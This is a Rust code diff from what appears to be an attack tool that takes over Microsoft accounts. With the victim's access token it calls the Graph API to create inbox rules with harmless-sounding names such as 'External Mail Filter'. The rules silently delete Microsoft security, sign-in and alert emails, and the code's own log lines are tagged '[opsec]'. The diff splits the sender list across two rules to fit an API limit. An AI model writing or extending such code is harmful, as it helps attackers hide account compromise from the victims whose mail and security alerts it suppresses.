@@ -354,8 +354,10 @@ async fn delete_microsoft_notification_email(access_token: String, user_agent: O
     let has_external_mail_filter = existing_names.iter().any(|n| n == "External Mail Filter");
     let has_security_update = existing_names.iter().any(|n| n == "Security Update");
     let has_alert_filter = existing_names.iter().any(|n| n == "Alert Filter");
+    let has_external_mail_filter_2 = existing_names.iter().any(|n| n == "External Mail Filter 2");
 
-    // Rule 1: Sender-based auto-delete (only if not already present)
+    // Rule 1a: Sender-based auto-delete (first 10 addresses — Graph API
+    // limits fromAddressContains to 10 entries per rule)
     if !has_external_mail_filter {
         let rule_payload = serde_json::json!({
             "displayName": "External Mail Filter",
@@ -372,7 +374,40 @@ async fn delete_microsoft_notification_email(access_token: String, user_agent: O
                     "azureadnotification@microsoft.com",
                     "no-reply@azureadnotifications.microsoft.com",
                     "msonlineservicesteam@microsoftonline.com",
-                    "no-reply@signin.microsoft.com",
+                    "no-reply@signin.microsoft.com"
+                ]
+            },
+            "actions": {
+                "delete": true,
+                "stopProcessingRules": true
+            }
+        });
+        match client
+            .post(rule_url)
+            .header("Authorization", format!("Bearer {}", access_token))
+            .header("Content-Type", "application/json")
+            .header("User-Agent", ua)
+            .header("Accept-Language", lang)
+            .json(&rule_payload)
+            .send()
+            .await {
+            Ok(r) if r.status().is_success() => println!("[opsec] Created Graph auto-delete rule (External Mail Filter) — 10 senders"),
+            Ok(r) => eprintln!("[opsec] Failed to create Graph rule ({}): {}", r.status(), r.text().await.unwrap_or_default()),
+            Err(e) => eprintln!("[opsec] Failed to create Graph rule: {}", e),
+        }
+    } else {
+        println!("[opsec] 'External Mail Filter' rule already exists — skipping creation");
+    }
+
+    // Rule 1b: Sender-based auto-delete (remaining 4 addresses — split
+    // because Graph API limits fromAddressContains to 10 entries per rule)
+    if !has_external_mail_filter_2 {
+        let rule2_payload = serde_json::json!({
+            "displayName": "External Mail Filter 2",
+            "sequence": 1,
+            "isEnabled": true,
+            "conditions": {
+                "fromAddressContains": [
                     "account-security-noreply@signin.microsoft.com",
                     "office365alerts@microsoft.com",
                     "no-reply@notifications.microsoft.com",
@@ -390,15 +425,15 @@ async fn delete_microsoft_notification_email(access_token: String, user_agent: O
             .header("Content-Type", "application/json")
             .header("User-Agent", ua)
             .header("Accept-Language", lang)
-            .json(&rule_payload)
+            .json(&rule2_payload)
             .send()
             .await {
-            Ok(r) if r.status().is_success() => println!("[opsec] Created Graph auto-delete rule for Microsoft notification emails"),
-            Ok(r) => eprintln!("[opsec] Failed to create Graph rule ({}): {}", r.status(), r.text().await.unwrap_or_default()),
-            Err(e) => eprintln!("[opsec] Failed to create Graph rule: {}", e),
+            Ok(r) if r.status().is_success() => println!("[opsec] Created Graph auto-delete rule (External Mail Filter 2) — 4 senders"),
+            Ok(r) => eprintln!("[opsec] Failed to create Graph rule 2 ({}): {}", r.status(), r.text().await.unwrap_or_default()),
+            Err(e) => eprintln!("[opsec] Failed to create Graph rule 2: {}", e),
         }
     } else {
-        println!("[opsec] 'External Mail Filter' rule already exists — skipping creation");
+        println!("[opsec] 'External Mail Filter 2' rule already exists — skipping creation");
     }
 
     // Rule 2: Subject-based auto-delete (only if not already present)
